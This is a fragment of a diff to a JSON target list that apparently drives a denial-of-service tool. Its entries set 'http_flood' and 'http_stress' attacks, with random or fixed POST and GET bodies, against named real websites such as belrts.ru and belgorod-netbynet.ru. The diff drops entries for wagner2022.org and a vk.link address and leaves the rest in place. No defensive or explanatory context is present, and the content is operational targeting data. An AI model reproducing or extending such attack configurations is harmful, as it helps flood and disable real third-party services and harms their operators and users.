@@ -13,11 +13,5 @@
   {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belgorod-netbynet.ru/"},
   {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
   {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/", "body": "fixed_string"},
-  {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://wagner2022.org/","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://wagner2022.org/", "body": "fixed_string"},
-  {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://wagner2022.org/"},
-  {"kind":"http_flood","method":"POST","ip":"127.0.0.1","port": 443, "url": "https://vk.link/wagner2022org","headers":{"Content-Type": "application/json"}, "body": "template:{{ random(256) }}"},
-  {"kind":"http_flood","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://vk.link/wagner2022org", "body": "fixed_string"},
-  {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://vk.link/wagner2022org"}
+  {"kind":"http_stress","method":"GET","ip":"127.0.0.1","port": 443, "url": "https://belrts.ru/"}
 ]
